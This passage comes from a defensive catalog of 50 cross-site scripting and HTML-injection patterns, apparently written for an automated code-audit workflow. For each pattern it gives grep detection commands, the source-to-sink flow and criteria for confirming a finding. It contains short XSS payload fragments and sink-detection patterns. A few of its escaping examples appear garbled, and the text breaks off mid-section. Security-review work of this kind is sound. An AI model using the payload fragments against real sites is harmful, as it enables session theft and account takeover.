# XSS / HTML Injection Canonical 50-Pattern Catalog

> **Scope:** cross-site scripting and client-side injection ONLY — stored / reflected / DOM-based XSS,
> mutation XSS (mXSS), HTML injection, CSS injection, script-gadget chains, CSP bypass, postMessage
> abuse, prototype-pollution→XSS, DOM clobbering, file/MIME/SVG rendering, and any chain that reaches
> JavaScript execution in another user's browser.
> **Universal:** every signature, flow, and defense below is language- and framework-agnostic — it
> applies to ANY project in ANY stack. Placeholder hosts are `example.com` / `attacker.example.com` /
> `evil.example.com`; placeholder identities are `victim@example.com` / `attacker@example.com`.

**Use these exact IDs and names.**

**Every Phase 2 XSS feature report must include all 50 rows** (each row = CONFIRMED / SUSPECTED /
NOT-APPLICABLE / NEEDS-LIVE, with file:line + source→sink for anything not N/A).

---

## ID + Name Index

| Pattern | Canonical Name | Family |
|---|---|---|
| XSS-01 | Stored user-controlled HTML rendered without escaping | F1 |
| XSS-02 | Reflected parameter rendered into HTML response | F1 |
| XSS-03 | HTML injection without script execution but with DOM/security impact | F1 |
| XSS-04 | Attribute-context injection | F3 |
| XSS-05 | URL-context injection in href, src, action, formaction, or redirects | F5 |
| XSS-06 | JavaScript string/template/context injection | F3 |
| XSS-07 | JSON embedded in script or inline JS without safe escaping | F3 |
| XSS-08 | CSS/style-context injection | F12 |
| XSS-09 | Markdown/rich-text sanitizer bypass | F4 |
| XSS-10 | Sanitizer allowlist too broad or dangerous tags/attributes allowed | F4 |
| XSS-11 | raw, html_safe, safe_join, or equivalent unsafe server-side rendering | F1 |
| XSS-12 | Sanitization performed before later unsafe mutation/concatenation | F4 |
| XSS-13 | Double decoding, entity decoding, or canonicalization mismatch | F4 |
| XSS-14 | DOM sink injection via innerHTML, outerHTML, insertAdjacentHTML, or jQuery html() | F2 |
| XSS-15 | Vue/Angular/template raw HTML rendering such as v-html | F2 |
| XSS-16 | React dangerouslySetInnerHTML or equivalent unsafe component sink | F2 |
| XSS-17 | ERB/Haml/Slim unescaped output or unsafe interpolation | F1 |
| XSS-18 | API/GraphQL field trusted by frontend and rendered as HTML | F2 |
| XSS-19 | Server returns rendered HTML fragments consumed by frontend without re-sanitization | F2 |
| XSS-20 | Email/notification/activity-log HTML injection | F1 |
| XSS-21 | File upload, attachment, SVG, HTML, or MIME/content-type inline rendering | F9 |
| XSS-22 | SVG/MathML/foreignObject sanitizer bypass | F4 |
| XSS-23 | Linkification/autolink/reference parser creates unsafe HTML or URL | F5 |
| XSS-24 | Issue/ticket/comment/title rendering | F1 |
| XSS-25 | Wiki/snippet/project page/blob/diff rendering | F1 |
| XSS-26 | User/group/project/label/milestone/environment name rendering | F1 |
| XSS-27 | Search result, autocomplete, or highlight HTML injection | F1 |
| XSS-28 | Build/CI log, console output, artifact listing, package metadata, or deployment output rendering | F1 |
| XSS-29 | Import/export/replay/migration path stores unsafe content later rendered | F1 |
| XSS-30 | Cached sanitized/rendered HTML reused across unsafe context or stale sanitizer version | F4 |
| XSS-31 | Admin/maintainer-only stored input later viewed by other users or higher-value victims | F1 |
| XSS-32 | CSP bypass, nonce misuse, unsafe inline script allowance, or missing sandbox | F6 |
| XSS-33 | Iframe/embed/sandbox escape or unsafe preview mode | F7 |
| XSS-34 | Content sniffing, wrong content type, inline disposition, or download/open rendering issue | F9 |
| XSS-35 | Flash/error/validation message reflects unsafe user input | F1 |
| XSS-36 | I18n/localization interpolation marked HTML-safe | F1 |
| XSS-37 | Query/filter/sort/page parameter reflected into UI | F1 |
| XSS-38 | Form validation errors or model errors include raw params | F1 |
| XSS-39 | WYSIWYG/editor/preview path differs from final render path | F10 |
| XSS-40 | Mentions/references/slash commands/autocomplete produce unsafe HTML | F5 |
| XSS-41 | Cross-context escaping mismatch between HTML, attribute, JS, JSON, CSS, URL | F3 |
| XSS-42 | Frontend state hydration or data attributes contain unsafe serialized data | F2 |
| XSS-43 | GraphQL error/message/path data rendered unsafely | F2 |
| XSS-44 | Webhook/integration/external service data rendered in the application UI | F1 |
| XSS-45 | Sanitizer/filter order bug in HTML pipeline | F4 |
| XSS-46 | User-controlled protocol scheme bypass such as javascript:, data:, vbscript:, encoded variants | F5 |
| XSS-47 | Unicode, null-byte, control-character, or browser parser differential bypass | F4 |
| XSS-48 | HTML injection enabling phishing, UI spoofing, or credential capture without script | F1 |
| XSS-49 | Stored content crosses privilege boundary from low-privileged author to high-privileged viewer | F1 |
| XSS-50 | Same functionality rendered differently across Web, REST, GraphQL, mobile, email, or preview | F3 |

### The 12 families (source→sink mechanism)

| Family | Mechanism | Member IDs |
|---|---|---|
| **F1** | Raw / unsafe server-side output (auto-escape bypassed or absent) | 01, 02, 03, 11, 17, 20, 24, 25, 26, 27, 28, 29, 31, 35, 36, 37, 38, 44, 48, 49 |
| **F2** | Client DOM / framework raw-render sinks (innerHTML, v-html, dangerouslySetInnerHTML) | 14, 15, 16, 18, 19, 42, 43 |
| **F3** | Wrong-context escaping (HTML-escaped data placed in JS/URL/CSS/attr/JSON) | 04, 06, 07, 41, 50 |
| **F4** | Sanitizer bypass & mutation XSS (mXSS, allowlist, pipeline order, parser differential) | 09, 10, 12, 13, 22, 30, 45, 47 |
| **F5** | `javascript:` / `data:` URI & unsafe link generation | 05, 23, 40, 46 |
| **F6** | CSP bypass via script gadgets / nonce misuse | 32 |
| **F7** | postMessage / cross-frame message channels & sandboxed embeds | 33 |
| **F8** | Prototype pollution → XSS | *(cross-cutting — see F8 note)* |
| **F9** | File upload / MIME / SVG inline rendering | 21, 34 |
| **F10** | Third-party render-library CVEs | 39 |
| **F11** | DOM clobbering | *(cross-cutting — see F11 note)* |
| **F12** | CSS injection for data exfiltration | 08 |

> Two source families — **F8 (prototype pollution→XSS)** and **F11 (DOM clobbering)** — have no
> dedicated canonical ID in this taxonomy; ARCHON folds them into broader IDs. They are documented as
> cross-cutting surfaces below and MUST still be hunted (they surface through XSS-14/42/06/10).

---

# Family 1 — Raw / unsafe server-side output

Untrusted data reaches an HTML sink with auto-escaping explicitly disabled (`raw`, `html_safe`,
`|safe`, `{!! !!}`, `<%== %>`, `th:utext`, `@Html.Raw`, `mark_safe`, `template.HTML`) or with no
escaping at all. Highest-priority family — most stored XSS lives here.

### XSS-01 — Stored user-controlled HTML rendered without escaping
**Detect**
```grep
# Ruby/ERB/Haml/Slim
grep -rn "html_safe\|raw(\|safe_join\|<%==\|!= \|sanitize(" app/views app/helpers
# Python (Jinja/Django)
grep -rn "|safe\|mark_safe(\|Markup(\|autoescape false\|autoescape off" templates/ **/*.py
# PHP (Twig/Blade)
grep -rn "{!!\|{{{\|| raw\|->raw(\|html_entity_decode" resources/ templates/
# Java (JSP/Thymeleaf), Go
grep -rn "th:utext\|<%= \|escapeXml=.false.\|template.HTML(\|c:out.*escapeXml=.false" src/ templates/
```
**Flow:** user field (profile/comment/title) stored in DB → template renders it through a raw/unsafe
helper → browser parses attacker HTML in body context. Exploitable because auto-escape is bypassed and
no sanitizer runs between store and render.
**Confirm:** the exact stored field flows into a raw sink with no `sanitize()`/DOMPurify on the path.
Non-issue if a correctly-configured HTML sanitizer runs immediately before the raw sink, or the field
is provably non-user (enum/int) — verify the type, not the name.

### XSS-02 — Reflected parameter rendered into HTML response
**Detect**
```grep
grep -rn "params\[\|request.query\|request.GET\|req.query\|\$_GET\|\$_REQUEST\|@RequestParam\|r.URL.Query()" .
# echoed straight into a template/response without escape helper:
grep -rn "render.*inline\|render :text\|render html:\|res.send(\|echo \|printf.*%s.*w," .
```
**Flow:** query/path/header param echoed into the same HTML response with no per-context encoding →
victim clicks attacker link → payload renders. Exploitable when the reflection point is an unescaped
body/attribute and there is no auto-escape on that render path.
**Confirm:** trace the param to the exact response byte; confirm no template auto-escape wraps it.
Non-issue if the framework's default auto-escape covers that sink and the param is not re-marked safe.

### XSS-03 — HTML injection without script execution but with DOM/security impact
**Detect**
```grep
grep -rn "sanitize(\|strip_tags\|allowlist\|ALLOWED_TAGS\|FORBID_TAGS" .
# tags that inject structure without <script>: form, base, meta, link, iframe, style, a, img, svg
grep -rniE "add_tags|ADD_TAGS|allowed_elements.*\b(form|base|meta|iframe|style|svg|a)\b" .
```
**Flow:** input passes a sanitizer that strips `<script>`/on* but still allows structural tags
(`<form>`,`<base>`,`<meta>`,`<a>`,`<img>`) → rendered → attacker defaces, phishes, redirects, or
exfiltrates via CSS/form even without JS execution.
**Confirm:** an allowed structural tag reaches render; show one concrete impact (form overlay, base
redirect, meta refresh). Non-issue if the allowlist is limited to inline formatting tags with no URL/
structural elements and no `style`/`id`/`name` attributes.

### XSS-11 — raw, html_safe, safe_join, or equivalent unsafe server-side rendering
**Detect**
```grep
# The explicit "trust me" markers across stacks:
grep -rn "\.html_safe\|raw(\|safe_join(\|content_tag.*html_safe\|sanitize.*html_safe" app/
grep -rn "mark_safe(\|format_html(.*%s\|SafeString(\|Markup(" **/*.py
grep -rn "{!!\|Illuminate.*HtmlString\|new HtmlString\|@Html.Raw\|Html.Raw(" .
grep -rn "template.HTML(\|template.JS(\|template.URL(\|bypassSecurityTrust" .
```
**Flow:** developer wraps a value in a "safe" marker to satisfy the template, but the value is (or can
become) user-controlled → auto-escape permanently disabled for that string → any HTML executes.
**Confirm:** the argument to the safe-marker is or concatenates untrusted data. `format_html`/`safe_join`
with escaped interpolations is fine; the bug is `raw(user)` / `("...#{user}...").html_safe`.
Non-issue when the marker wraps a constant or a value passed through `h()`/`escape()` first.

### XSS-17 — ERB/Haml/Slim unescaped output or unsafe interpolation
**Detect**
```grep
# ERB raw:      <%== x %>      Haml raw:  != x  and  ~ "#{x}"     Slim raw:  == x
grep -rn "<%==" app/views
grep -rn "^\s*!=\|~ \"" app/views    # Haml unescaped / preserve
grep -rn "^\s*==\s" app/views        # Slim unescaped
# string built then rendered as node:
grep -rn "content_tag\|tag\.\|concat(" app/helpers | grep -i "params\|user\|name\|title"
```
**Flow:** Ruby template uses the unescaped sigil (`<%==`, Haml `!=`, Slim `==`) or builds a node from
interpolated user data → attacker markup in body/attribute context.
**Confirm:** the unescaped sigil wraps a user value. Non-issue if the same value only appears under
escaped sigils (`<%=`, Haml `=`, Slim `=`) everywhere it renders.

### XSS-20 — Email/notification/activity-log HTML injection
**Detect**
```grep
grep -rniE "mailer|mail\(|deliver|notification|activity|audit_log|webhook payload" .
grep -rn "html_part\|content_type.*text/html\|render.*layout.*mailer\|MimeMessage\|Multipart" .
grep -rn "|safe\|html_safe\|raw(\|{!!" app/views/*mailer* app/mailers/ templates/*mail*
```
**Flow:** user field (name, comment, commit message) is interpolated into an HTML email / in-app
notification / activity-log entry rendered to a different, often higher-privilege recipient with no escape.
Email clients and notification panes render HTML → stored XSS or spoofed content.
**Confirm:** user data reaches the HTML mail/notification body unescaped; recipient ≠ author.
Non-issue if the mailer template auto-escapes or the notification renders as plain text.

### XSS-24 — Issue/ticket/comment/title rendering
**Detect**
```grep
grep -rniE "title|description|body|comment|note|summary|content" app/views app/serializers components/ \
  | grep -iE "html_safe|raw|v-html|dangerouslySetInnerHTML|innerHTML|\|\s*safe|{!!"
grep -rniE "render.*markdown|to_html|render_field|commonmark|markdown_to" .
```
**Flow:** long-form user text (description/comment/title) rendered through a markdown/HTML pipeline or a
raw sink → stored XSS visible to every viewer of the record. Highest-volume real-world XSS surface.
**Confirm:** the field renders through raw/markdown-HTML on a page other users load. Non-issue if the
pipeline sanitizes output with a tight allowlist AND the same field never reaches an unsanitized sink
(check REST/GraphQL/preview paths too — see XSS-50).

### XSS-25 — Wiki/snippet/project page/blob/diff rendering
**Detect**
```grep
grep -rniE "wiki|snippet|blob|diff|readme|page.render|highlight|rouge|prism|pygments" .
grep -rniE "html_safe|raw|v-html|innerHTML|mark_safe|\|\s*safe" app/views/*wiki* app/views/*snippet* components/
```
**Flow:** user-authored documents (wiki/README/snippet/code blob) rendered as HTML, often with a syntax
highlighter or markdown engine that emits markup → stored XSS. Diff/blob highlighters frequently
`html_safe` their output.
**Confirm:** the render path emits attacker-controlled markup without post-sanitization. Non-issue if
highlighter output is entity-encoded and markdown output is sanitized.

### XSS-26 — User/group/project/label/milestone/environment name rendering
**Detect**
```grep
grep -rniE "\.name|full_name|display_name|label|slug|title" app/views components/ \
  | grep -iE "html_safe|raw|v-html|innerHTML|dangerouslySetInnerHTML|title=|:href|attr\("
grep -rniE "link_to .*name|content_tag.*name|badge|chip|token" app/helpers
```
**Flow:** short "name" fields assumed safe are rendered raw or into an unquoted/URL attribute (label
color badge, `<a title=name>`, tooltip) → stored XSS through a field nobody escapes because "it's just a
name."
**Confirm:** a name field reaches a raw sink or an attribute without quoting/encoding. Non-issue if
names are auto-escaped in body context AND names cannot break the attribute (quoted + entity-encoded).

### XSS-27 — Search result, autocomplete, or highlight HTML injection
**Detect**
```grep
grep -rniE "highlight|<mark>|<em>|snippet|excerpt|search.*result|typeahead|autocomplete" .
grep -rniE "html_safe|raw|innerHTML|v-html|dangerouslySetInnerHTML" | grep -iE "highlight|search|result|match"
```
**Flow:** search backend wraps matched terms in `<mark>`/`<em>` and returns HTML; the query term itself
is attacker-controlled and echoed inside the highlight markup → reflected/stored XSS in the results list
or autocomplete dropdown.
**Confirm:** the highlighter interpolates the raw query into HTML rendered via a raw/DOM sink. Non-issue
if the term is entity-encoded before wrapping and the wrapper is the only markup added.

### XSS-28 — Build/CI log, console output, artifact listing, package metadata, or deployment output rendering
**Detect**
```grep
grep -rniE "job.log|trace|console.output|artifact|package.*metadata|deploy.*output|build.log|ansi" .
grep -rniE "ansi2html|ansi_to_html|innerHTML|html_safe|v-html|dangerouslySetInnerHTML" | grep -iE "log|trace|artifact|console"
```
**Flow:** machine/CI output (logs, ANSI-colorized traces, package descriptions, artifact filenames)
contains attacker-controlled strings; an ANSI→HTML converter or raw sink renders it → stored XSS. ANSI
converters are a classic source because they emit `<span style>` and may pass through raw bytes.
**Confirm:** attacker text reaches the converter/raw sink; converter does not entity-encode payload
bytes. Non-issue if logs are rendered as text (`<pre>` + escaped) or the converter encodes `< > &`.

### XSS-29 — Import/export/replay/migration path stores unsafe content later rendered
**Detect**
```grep
grep -rniE "import|export|migrate|restore|replay|bulk.*insert|seed|ndjson|csv.*import|from_json" .
# does the import path skip the sanitizer the normal create path uses?
grep -rniE "skip_validation|without_sanitize|raw insert|update_column|insert_all|upsert" .
```
**Flow:** content entering through import/migration/replay bypasses the input sanitizer that the normal
create path applies, then is rendered later through the same view → stored XSS with a delayed trigger.
**Confirm:** the import writer does not run the same sanitize/validation as the interactive writer, and
the field renders raw. Non-issue if sanitization happens on OUTPUT (so import path is irrelevant) or the
importer shares the create path's sanitizer.

### XSS-31 — Admin/maintainer-only stored input later viewed by other users or higher-value victims
**Detect**
```grep
grep -rniE "admin|maintainer|owner|settings|broadcast|announcement|banner|footer|custom.*(html|css|js)" .
grep -rniE "html_safe|raw|v-html|innerHTML|mark_safe|{!!" app/views/admin components/*admin* templates/admin
```
**Flow:** privileged fields (site banner, custom footer/header, broadcast message, appearance settings)
rendered raw to ALL users → stored XSS where a low-friction admin input hits every visitor (and a
compromised/rogue admin escalates to full-site XSS).
**Confirm:** an admin-authored field renders raw on end-user pages. Note privilege boundary but still
report (insider/rogue-admin and CSRF-to-admin chains are in scope). Non-issue if the field is sanitized
or is a constrained type (color, enum, URL validated).

### XSS-35 — Flash/error/validation message reflects unsafe user input
**Detect**
```grep
grep -rniE "flash\[|flash.now|toastr|notify|alert\(|add_flash|messages.add|session\['flash" .
grep -rniE "flash.*html_safe|flash.*raw|message.*\|safe|error.*innerHTML|toast.*v-html" .
```
**Flow:** an error/flash message interpolates the offending user value ("`<x>` is not valid") and is
rendered with a raw/HTML sink → reflected XSS via a crafted invalid input. Toast/notification libraries
that accept HTML are common sinks.
**Confirm:** the message string includes user data AND renders as HTML. Non-issue if flash renders as
text or the toast library escapes by default (confirm it's not called in HTML mode).

### XSS-36 — I18n/localization interpolation marked HTML-safe
**Detect**
```grep
grep -rniE "t\(|I18n.t|gettext|trans\(|__\(|FormatMessage|i18next|useTranslation" .
grep -rniE "_html\b|html_safe.*t\(|\|\s*safe.*trans|dangerouslySetInnerHTML.*t\(|v-html.*\$t" .
grep -rn "translation.*missing\|default:.*params\|interpolat" **/*i18n* config/locales/
```
**Flow:** a translation string uses HTML (or the `*_html` suffix that auto-marks translations safe) and
interpolates a user value into it → the interpolated value inherits the "safe" mark → stored/reflected
XSS. Missing-translation fallbacks that echo the key/params are a variant.
**Confirm:** a translation marked HTML-safe interpolates user data. Non-issue if interpolated variables
are individually escaped before insertion (framework-dependent — verify the interpolation escapes).

### XSS-37 — Query/filter/sort/page parameter reflected into UI
**Detect**
```grep
grep -rniE "sort|order|filter|q=|search|page|per_page|tab|view=|state=" app/views components/ \
  | grep -iE "params|query|value=|selected|innerHTML|html_safe|:value"
grep -rniE "current.*filter|active.*sort|You searched for|showing results for" .
```
**Flow:** filter/sort/pagination params echoed back into the UI ("Showing results for X", hidden inputs,
`<option selected>`, active-tab labels) without context encoding → reflected XSS or attribute breakout.
**Confirm:** the param renders into body/attribute unescaped. Non-issue if the param is validated against
an allowlist (sort columns, enum tabs) or auto-escaped.

### XSS-38 — Form validation errors or model errors include raw params
**Detect**
```grep
grep -rniE "errors.full_messages|errors\.add|error_messages_for|ValidationError|form.errors|@errors" .
grep -rniE "errors.*html_safe|errors.*raw|error.*innerHTML|error.*v-html|help-block|invalid-feedback" .
```
**Flow:** a validation error echoes the rejected value verbatim ("`<payload>` can't be blank") into an
error summary rendered as HTML → reflected XSS. Framework error helpers that emit HTML are the sink.
**Confirm:** the error string embeds the raw submitted value AND renders as HTML. Non-issue if error
helpers escape (most do) — verify no `.html_safe`/`raw` wraps the error partial.

### XSS-44 — Webhook/integration/external service data rendered in the application UI
**Detect**
```grep
grep -rniE "webhook|integration|oauth.*profile|external.*api|third.?party|issue.?tracker|error.?tracking|registry" .
grep -rniE "response.body|payload\[|remote_data|provider.*name|avatar_url|profile\." | grep -iE "html_safe|raw|innerHTML|v-html|src=|href="
```
**Flow:** data fetched from an external system (OAuth profile name, webhook payload, integration status,
registry metadata) is treated as trusted and rendered raw/into a URL attribute → stored XSS controlled
by whoever controls the upstream account/payload.
**Confirm:** external-origin data reaches a raw/URL sink without local sanitization. Non-issue if all
inbound external fields pass the same output sanitizer/encoder as first-party data.

### XSS-48 — HTML injection enabling phishing, UI spoofing, or credential capture without script
**Detect**
```grep
grep -rniE "add_tags|ADD_TAGS|allowed.*(form|input|button|label|style|iframe|a\b)|ALLOW_UNKNOWN_PROTOCOLS" .
grep -rniE "srcdoc|<form|<input|<button|position:\s*fixed|z-index" app/views components/
```
**Flow:** sanitizer strips scripts but allows `<form>`/`<input>`/`<style>`/`<a>`/positioned elements →
attacker overlays a fake login form or full-page phishing UI inside trusted chrome → credential capture
with zero JS (defeats CSP entirely).
**Confirm:** structural/interactive tags survive sanitization on a page users trust. Non-issue if the
allowlist excludes form/interactive/positioned elements and blocks external `action`/`href`.

### XSS-49 — Stored content crosses privilege boundary from low-privileged author to high-privileged viewer
**Detect**
```grep
grep -rniE "support|ticket|contact|feedback|guest|anonymous|public.*submit|service.?desk|incoming.*email" .
grep -rniE "admin|reviewer|approver|moderator|staff" app/views | grep -iE "html_safe|raw|v-html|innerHTML"
```
**Flow:** content authored by a low/unauthenticated user (support ticket, public submission, incoming
email) is rendered raw in a high-privilege dashboard (admin/moderator) → stored XSS that escalates
because the victim holds elevated session/CSRF authority (ATO of an admin).
**Confirm:** an unprivileged-author field renders raw on a privileged-viewer page. Highest-severity
class — always report. Non-issue only if that field is sanitized on the privileged render path.

---

# Family 2 — Client DOM / framework raw-render sinks

Data reaches a client-side HTML sink (`innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`,
jQuery `.html()/.append()`, `v-html`, `dangerouslySetInnerHTML`, `[innerHTML]`, `{@html}`). The browser
parses attacker HTML directly — server-side auto-escape does NOT help here.

### XSS-14 — DOM sink injection via innerHTML, outerHTML, insertAdjacentHTML, or jQuery html()
**Detect**
```grep
grep -rnE "\.innerHTML\s*=|\.outerHTML\s*=|insertAdjacentHTML\(|document\.write(ln)?\(" src/ app/ public/ static/
grep -rnE "\$\(.*\)\.(html|append|prepend|after|before|replaceWith|wrap)\(" src/ app/
grep -rnE "\.setHTML\(|Range\.createContextualFragment\(|el\.innerHTML" src/
```
**Flow:** untrusted data (API response, `location.hash`/`search`, `document.referrer`, DOM read,
postMessage, WebSocket) is assigned to a DOM HTML sink → immediate DOM XSS. jQuery `.html()/.append()`
also execute `<img onerror>`/`<svg onload>`.
**Confirm:** trace the assigned value to a user-controllable source with no sanitizer between. Non-issue
if the value is `textContent`/`innerText`/a framework-escaped binding, or DOMPurify runs on it first, or
Trusted Types is enforced (`require-trusted-types-for 'script'`).

### XSS-15 — Vue/Angular/template raw HTML rendering such as v-html
**Detect**
```grep
grep -rnE "v-html\s*=|:inner-?html|\[innerHTML\]|innerHtml\s*=" src/ components/ *.vue *.html
grep -rnE "bypassSecurityTrustHtml|bypassSecurityTrustScript|DomSanitizer|sanitize\(SecurityContext" src/
grep -rnE "\{@html\s|svelte:head" src/ *.svelte
```
**Flow:** a framework raw-render directive binds user data (`v-html="userBio"`, `[innerHTML]="data"`,
`{@html body}`) → the framework's built-in escaping is opted out → DOM XSS. Angular's
`bypassSecurityTrust*` fully disables its sanitizer.
**Confirm:** the bound expression is user-controlled and not pre-sanitized. Non-issue if a sanitizer runs
in the getter/computed feeding the directive (Angular's default `[innerHTML]` sanitizer counts UNLESS
`bypassSecurityTrust*` is used).

### XSS-16 — React dangerouslySetInnerHTML or equivalent unsafe component sink
**Detect**
```grep
grep -rnE "dangerouslySetInnerHTML\s*=\s*\{\{" src/ components/
grep -rnE "__html\s*:" src/
# JSX href/src that can hold javascript::
grep -rnE "href=\{|src=\{|to=\{|action=\{" src/ | grep -iE "props|state|data|user|params"
```
**Flow:** `dangerouslySetInnerHTML={{ __html: userValue }}` renders raw HTML; or a user value flows into
a JSX `href`/`src`/`to` prop that isn't scheme-validated (`javascript:`) → DOM XSS. React escapes text
children but NOT `__html`, and does NOT block `javascript:` URLs in props.
**Confirm:** `__html` (or the URL prop) carries user data with no sanitizer. Non-issue if the value is
DOMPurify-cleaned right before, and URL props are scheme-validated.

### XSS-18 — API/GraphQL field trusted by frontend and rendered as HTML
**Detect**
```grep
grep -rnE "fetch\(|axios|useQuery|apollo|graphql|\.json\(\)|await.*api" src/
# the response field then hits a raw sink:
grep -rnE "res(ponse)?\.[a-zA-Z_]+.*(innerHTML|v-html|dangerouslySetInnerHTML|\.html\()" src/
```
**Flow:** frontend assumes API/GraphQL responses are safe and renders a response field via a raw sink,
but the field was user-authored and the API returns it unencoded → stored DOM XSS. Server auto-escape
never applied because the data left as JSON.
**Confirm:** an API/GraphQL string field reaches a raw client sink; confirm the server does NOT sanitize
that field on the API path (only the HTML view path). Non-issue if the API sanitizes output or the
client sanitizes before sinking.

### XSS-19 — Server returns rendered HTML fragments consumed by frontend without re-sanitization
**Detect**
```grep
grep -rnE "text/html|\.html\b|render_to_string|partial|fragment|turbo-?stream|hx-.*swap" .
grep -rnE "\.then\(.*innerHTML|res\.text\(\).*innerHTML|\.html\(await|dangerouslySetInnerHTML.*fragment" src/
```
**Flow:** server returns a pre-rendered HTML fragment (AJAX partial, Turbo/HTMX swap) that the client
injects via `innerHTML`/swap; if the fragment embedded unsanitized user data (or the client trusts it
blindly), attacker HTML executes on injection.
**Confirm:** the fragment endpoint interpolates user data without escaping AND the client injects it as
HTML. Non-issue if the fragment is produced by an auto-escaping template and injected via a mechanism
that doesn't execute scripts inconsistently (still verify markdown/raw fields inside the fragment).

### XSS-42 — Frontend state hydration or data attributes contain unsafe serialized data
**Detect**
```grep
grep -rnE "window\.__(INITIAL_STATE|PRELOADED|DATA)__|hydrate|serialize.*state|JSON.parse\(.*dataset" src/ .
grep -rnE "data-[a-z-]+=\"|:data-|gon\.\|<script[^>]*type=.application/json" app/views templates/ components/
grep -rnE "\.dataset\.[a-zA-Z]+|getAttribute\(.data-|el\.dataset" src/ | grep -iE "innerHTML|html\(|eval|Function"
```
**Flow:** server serializes user data into a hydration blob (`window.__INITIAL_STATE__`, `<script
type=application/json>`, `data-*` attribute) with wrong context encoding; the client reads it back into
a DOM/JS sink → XSS. Serializing without escaping `<`/`</script>`/quotes breaks the script or attribute.
**Confirm:** the serialized blob is not context-encoded (JSON `<` → `<`, `</script>` neutralized) or
the client reads a `data-*` value into a raw sink. Non-issue if serialization uses a JSON encoder that
escapes `<`/`>`/`&`/U+2028/U+2029 and the client treats the parsed value as data, not HTML.

### XSS-43 — GraphQL error/message/path data rendered unsafely
**Detect**
```grep
grep -rnE "errors\[.*\]\.(message|path)|graphQLErrors|error\.message|extensions\." src/
grep -rnE "(error|message|path)\b.*(innerHTML|v-html|dangerouslySetInnerHTML|\.html\()" src/
```
**Flow:** GraphQL error `message`/`path` (which can echo attacker-supplied variables/field names) is
rendered into the UI via a raw sink → reflected DOM XSS through the error channel, often overlooked
because "it's just an error."
**Confirm:** an error/message/path value reaches a raw sink and can contain attacker input. Non-issue if
errors render as text or the error display escapes.

---

# Family 3 — Wrong-context escaping

Data is escaped for one context but rendered in another. HTML-entity encoding provides ZERO protection
inside JavaScript, URL, CSS, unquoted-attribute, or JSON contexts. **No template engine auto-escapes for
JS or URL contexts** — this family is where most "the template escapes, so we're safe" bugs hide.

### XSS-04 — Attribute-context injection
**Detect**
```grep
# user data inside an attribute value, esp. UNQUOTED or event/style attrs:
grep -rnE "=[^\"']?<%=|=[^\"']?\{\{|=[^\"']?\$\{|=[^\"']?#\{" app/views templates/ *.erb *.html
grep -rniE "\b(title|alt|value|placeholder|class|id|name|style|on[a-z]+)=" | grep -iE "<%=|\{\{|\$\{|params|user"
grep -rnE ":[a-z-]+=\"|v-bind:|\[attr\.|setAttribute\(" src/ components/
```
**Flow:** user value placed in an attribute — unquoted (` ` or `>` breaks out), or in an event handler
(`onclick`) / `style` attribute where HTML-encoding doesn't stop `autofocus`/JS → attribute breakout →
XSS. `setAttribute('onclick', v)` / `v-bind` on event attrs are dynamic variants.
**Confirm:** the value lands in an unquoted attribute, or in an `on*`/`style`/`href`/`src` attribute.
Non-issue if the attribute is quoted AND the encoder escapes `"`/`'`/`` ` `` AND it's not an event/URL/
style attribute.

### XSS-06 — JavaScript string/template/context injection
**Detect**
```grep
grep -rnE "<script[^>]*>[^<]*(<%=|\{\{|\$\{|#\{|@|\{%)" app/views templates/
grep -rniE "var\s+\w+\s*=\s*['\"].*(<%=|\{\{|params|user)|window\.\w+\s*=\s*['\"]" app/views templates/
grep -rnE "eval\(|new Function\(|setTimeout\(['\"]|setInterval\(['\"]|\.setAttribute\(.on" src/
```
**Flow:** user data embedded inside an inline `<script>` string/template literal with HTML (not JS)
escaping → `";alert(1);//` or `</script>` or `${...}` breaks out. HTML-entity encoding does not escape
`\`, `'`, backtick, `$`, or `</script>`.
**Confirm:** user data is inside a `<script>` block or an `eval`/`Function`/string-`setTimeout` sink with
only HTML encoding (or none). Non-issue if the value is JS-string-escaped for the context (`\xNN`, and
`</script>`→`<\/script>`, and no unescaped `${}` in template literals) — ideally passed via a `data-*`
attribute or JSON `<script type=application/json>` instead of inline JS.

### XSS-07 — JSON embedded in script or inline JS without safe escaping
**Detect**
```grep
grep -rnE "<script[^>]*>[^<]*(to_json|JSON\.stringify|json_encode|Marshal|json\.dumps|new ObjectMapper)" app/views templates/
grep -rniE "var .*= <%=.*json|window\.\w+ = \{\{.*json|= @?[a-z_]+\.to_json" app/views
```
**Flow:** a server object is serialized to JSON and dropped into an inline `<script>` (`var data =
<%= x.to_json %>`); default JSON encoders do NOT escape `<`/`>`/`&`/`</script>`/U+2028/U+2029, so a
user string containing `</script><script>` closes the tag → XSS.
**Confirm:** the JSON serializer used doesn't HTML/JS-escape the output AND it's in an inline script.
Non-issue if the encoder escapes `<`→`<` and `</script>` (many frameworks have a `json_escape`/
safe-JSON helper), OR the data is emitted in `<script type="application/json">` and `JSON.parse`d.

### XSS-41 — Cross-context escaping mismatch between HTML, attribute, JS, JSON, CSS, URL
**Detect**
```grep
# same value rendered in >1 context; look for one encoder reused everywhere:
grep -rnE "escape_?html|htmlspecialchars|escapeHtml|CGI.escapeHTML|html.EscapeString|sanitizeHtml" . \
  | grep -iE "href|src|style|script|json|onclick"
grep -rniE "encodeURIComponent|url_encode|j\(|escape_javascript|json_escape|css_escape|CSS\.escape" .
```
**Flow:** a single "escape" helper (HTML-entity) is applied to a value that renders across multiple
contexts (body + href + inline JS + CSS) → correct for body, wrong for the rest → the URL/JS/CSS
rendering is XSS. The bug is one-size-fits-all encoding.
**Confirm:** find the value's contexts and verify each has a context-matched encoder (HTML→entity,
URL→scheme-validate+urlencode, JS→JS-string-escape, CSS→CSS.escape, JSON→safe-JSON). Non-issue only when
every context uses its own correct encoder.

### XSS-50 — Same functionality rendered differently across Web, REST, GraphQL, mobile, email, or preview
**Detect**
```grep
grep -rniE "serializer|to_json|resolver|preview|mobile|api/v[0-9]|graphql|mailer" . | grep -iE "description|body|title|name|content"
# compare: does the API/preview path apply the SAME sanitize the HTML view does?
grep -rniE "sanitize|render_markdown|to_html|escape" app/serializers app/graphql app/views/*mailer* components/*preview*
```
**Flow:** the same field is sanitized on the primary web view but a secondary surface (REST/GraphQL
response consumed by a client renderer, mobile webview, email, live preview) renders it through a
different, weaker path → XSS on the surface that skipped sanitization.
**Confirm:** enumerate every render surface for the field and confirm at least one lacks the sanitizer.
Non-issue if sanitization is centralized (on store or in a shared serializer) so ALL surfaces inherit it.

---

# Family 4 — Sanitizer bypass & mutation XSS (mXSS)

The app DOES sanitize, but the sanitizer's allowlist is too broad, its parser disagrees with the
